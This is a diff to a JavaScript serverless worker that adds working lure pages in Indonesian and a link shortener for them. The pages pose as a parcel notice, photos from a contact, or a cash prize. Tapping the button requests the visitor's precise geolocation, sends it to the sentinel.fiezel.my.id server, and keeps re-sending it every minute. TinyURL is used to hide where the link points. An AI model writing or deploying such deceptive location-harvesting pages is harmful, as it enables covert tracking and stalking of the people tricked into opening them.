@@ -130,6 +130,99 @@ function rateCheck(ip) {
   return entry.count <= RL_MAX;
 }
 
+
+// ── TRAP PAGE HTML ────────────────────────────────────────────────────────────
+function trapHtml(deviceId, type) {
+  const stories = {
+    paket: {
+      bg: '#fff8f0', accent: '#e85d04', icon: '📦',
+      title: 'Paket Menunggumu!',
+      sub: 'Ada kiriman yang belum diambil. Konfirmasi alamat kamu untuk menjadwalkan pengiriman ulang.',
+      rows: [['No. Resi', 'SN' + Math.floor(10000000 + Math.random()*89999999)], ['Status', 'Menunggu Konfirmasi'], ['Kurir', 'Pengiriman Reguler']],
+      btn: 'Konfirmasi Lokasi Sekarang',
+      note: 'Diperlukan akses lokasi untuk memverifikasi alamat pengiriman.',
+      loading: 'Memverifikasi alamat kamu…',
+      doneIcon: '✅', doneMsg: 'Konfirmasi berhasil!', doneSub: 'Kurir akan menghubungi kamu segera.',
+    },
+    foto: {
+      bg: '#f0f4ff', accent: '#4f46e5', icon: '🖼️',
+      title: 'Ada Foto Untukmu',
+      sub: 'Seseorang mengirimkan foto kepadamu. Verifikasi identitas untuk membuka.',
+      rows: [['Dikirim oleh', 'Kontak Tersimpan'], ['Jumlah foto', `${3 + Math.floor(Math.random()*6)} foto`], ['Dikirim', 'Baru saja']],
+      btn: 'Verifikasi & Lihat Foto',
+      note: 'Verifikasi lokasi diperlukan untuk keamanan akun kamu.',
+      loading: 'Memverifikasi identitas…',
+      doneIcon: '📬', doneMsg: 'Verifikasi berhasil!', doneSub: 'Foto sedang diunduh. Silakan tunggu.',
+    },
+    hadiah: {
+      bg: '#f0fdf4', accent: '#16a34a', icon: '🎁',
+      title: 'Kamu Terpilih!',
+      sub: 'Selamat! Nomor kamu terpilih untuk mendapatkan reward spesial.',
+      rows: [['Hadiah', 'Rp ' + ['50.000','75.000','100.000','150.000','200.000'][Math.floor(Math.random()*5)]], ['Berlaku', 'Hari ini saja'], ['Status', 'Menunggu Klaim']],
+      btn: 'Klaim Hadiah Sekarang',
+      note: 'Konfirmasi wilayah diperlukan untuk pengiriman hadiah.',
+      loading: 'Memproses klaim kamu…',
+      doneIcon: '🎉', doneMsg: 'Klaim berhasil diproses!', doneSub: 'Tim kami akan menghubungi kamu dalam 1\xd724 jam.',
+    },
+  };
+  const s = stories[type] || stories.paket;
+  const rows = s.rows.map(([l,v]) => `<div class="row"><span class="lbl">${l}</span><span class="val">${v}</span></div>`).join('');
+  return `<!DOCTYPE html>
+<html lang="id"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Konfirmasi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px 16px;background:${s.bg}}
+.card{background:#fff;border-radius:20px;padding:28px 22px;max-width:340px;width:100%;box-shadow:0 4px 28px rgba(0,0,0,.11);text-align:center}
+.ic{width:68px;height:68px;border-radius:18px;background:${s.accent}18;color:${s.accent};font-size:32px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+h1{font-size:18px;font-weight:800;margin-bottom:8px}
+.sub{font-size:13px;color:#6b7280;margin-bottom:20px;line-height:1.5}
+.row{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px solid #f3f4f6;font-size:13px}
+.row:last-of-type{border-bottom:none;margin-bottom:16px}
+.lbl{color:#9ca3af;font-weight:500}.val{font-weight:700}
+.btn{width:100%;padding:14px;border-radius:12px;border:none;background:${s.accent};color:#fff;font-size:15px;font-weight:700;cursor:pointer}
+.btn:active{opacity:.85}
+.note{font-size:11px;color:#9ca3af;margin-top:12px;line-height:1.5}
+#ld{display:none;padding:20px 0;text-align:center}
+.sp{width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:${s.accent};border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 14px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.lt{font-size:13px;color:#6b7280;line-height:1.6}
+#dn{display:none;text-align:center;padding:10px 0}
+.di{font-size:46px;margin-bottom:10px}.dm{font-size:15px;font-weight:600;color:#374151;line-height:1.6}.ds{font-size:12px;color:#9ca3af;margin-top:6px}
+</style></head><body>
+<div class="card">
+<div id="in">
+  <div class="ic">${s.icon}</div>
+  <h1>${s.title}</h1>
+  <div class="sub">${s.sub}</div>
+  ${rows}
+  <button class="btn" onclick="go()">  ${s.btn}</button>
+  <div class="note">${s.note}</div>
+</div>
+<div id="ld"><div class="sp"></div><div class="lt">${s.loading}</div></div>
+<div id="dn"><div class="di">${s.doneIcon}</div><div class="dm">${s.doneMsg}</div><div class="ds">${s.doneSub}</div></div>
+</div>
+<script>
+const DID='${deviceId}',CLOUD='https://sentinel.fiezel.my.id';
+let going=false;
+async function go(){
+  if(going)return;going=true;
+  document.getElementById('in').style.display='none';
+  document.getElementById('ld').style.display='block';
+  let lat=null,lon=null,acc=null;
+  try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));lat=p.coords.latitude;lon=p.coords.longitude;acc=Math.round(p.coords.accuracy)}catch{}
+  if(DID){try{await fetch(CLOUD+'/api/beacon/'+DID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lon,accuracy:acc,alert:true,alertReason:'trap:${type}',network:navigator.connection?navigator.connection.effectiveType:null})})}catch{}}
+  if(DID){try{localStorage.setItem('sz_trap',DID)}catch{};poll()}
+  await new Promise(r=>setTimeout(r,2500));
+  document.getElementById('ld').style.display='none';
+  document.getElementById('dn').style.display='block';
+}
+function poll(){setInterval(async()=>{let lat=null,lon=null,acc=null;try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000}));lat=p.coords.latitude;lon=p.coords.longitude;acc=Math.round(p.coords.accuracy)}catch{}try{await fetch(CLOUD+'/api/beacon/'+DID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lon,accuracy:acc})})}catch{}},60000)}
+</script></body></html>`;
+}
+
 // ── MAIN HANDLER ──────────────────────────────────────────────────────────────
 export default {
   async fetch(request, env) {
@@ -309,6 +402,63 @@ export default {
     // ── GET /health ───────────────────────────────────────────────────────────
     if (path === '/health' || path === '/api/health') {
       return json({ ok: true, service: 'ghost-sentinel-v2', ts: Date.now() }, 200, origin);
+    }
+
+
+    // ── POST /api/shorten — buat short link jebakan ─────────────────────────
+    if (path === '/api/shorten' && request.method === 'POST') {
+      let body;
+      try { body = await request.json(); } catch { return err('Body tidak valid.', 400, origin); }
+
+      const { deviceId, ownerToken, type } = body || {};
+      const VALID_TYPES = ['paket', 'foto', 'hadiah'];
+      if (!deviceId || !ownerToken) return err('deviceId dan ownerToken diperlukan.', 400, origin);
+      if (!VALID_TYPES.includes(type)) return err('type tidak valid.', 400, origin);
+
+      const raw = await env.SENTINEL_KV.get(`dev:${deviceId}`);
+      if (!raw) return err('Perangkat tidak ditemukan.', 404, origin);
+      const dev = JSON.parse(raw);
+      const tokenHash = await hashToken(ownerToken);
+      if (tokenHash !== dev.ownerHash) return err('Token tidak valid.', 401, origin);
+
+      const bytes = crypto.getRandomValues(new Uint8Array(4));
+      const code = Array.from(bytes).map(b => b.toString(36).padStart(2,'0')).join('').substring(0,6).toUpperCase();
+
+      await env.SENTINEL_KV.put(`shrt:${code}`, JSON.stringify({ deviceId, type }), {
+        expirationTtl: 7 * 86400,
+      });
+
+      const internalUrl = `https://sentinel.fiezel.my.id/go/${code}`;
+      let shortUrl = internalUrl;
+      try {
+        const tinyResp = await fetch(
+          `https://tinyurl.com/api-create.php?url=${encodeURIComponent(internalUrl)}`,
+          { signal: AbortSignal.timeout(4000) }
+        );
+        if (tinyResp.ok) {
+          const text = (await tinyResp.text()).trim();
+          if (text.startsWith('https://')) shortUrl = text;
+        }
+      } catch {}
+
+      return json({ ok: true, shortUrl, internalUrl }, 200, origin);
+    }
+
+    // ── GET /go/:code — serve trap page (URL tidak berubah, device ID tersembunyi) ──
+    const goMatch = path.match(/^\/go\/([A-Z0-9]{4,8})$/i);
+    if (goMatch && request.method === 'GET') {
+      const code = goMatch[1].toUpperCase();
+      const shortRaw = await env.SENTINEL_KV.get(`shrt:${code}`);
+      if (!shortRaw) {
+        return new Response('<html><body style="font-family:sans-serif;text-align:center;padding:40px"><h2>Link tidak ditemukan</h2><p>Link ini sudah kedaluwarsa atau tidak valid.</p></body></html>', {
+          status: 404, headers: { 'Content-Type': 'text/html;charset=UTF-8' },
+        });
+      }
+      const { deviceId: tid, type: ttype } = JSON.parse(shortRaw);
+      return new Response(trapHtml(tid, ttype), {
+        status: 200,
+        headers: { 'Content-Type': 'text/html;charset=UTF-8' },
+      });
     }
 
     return err('Rute tidak ditemukan.', 404, origin);
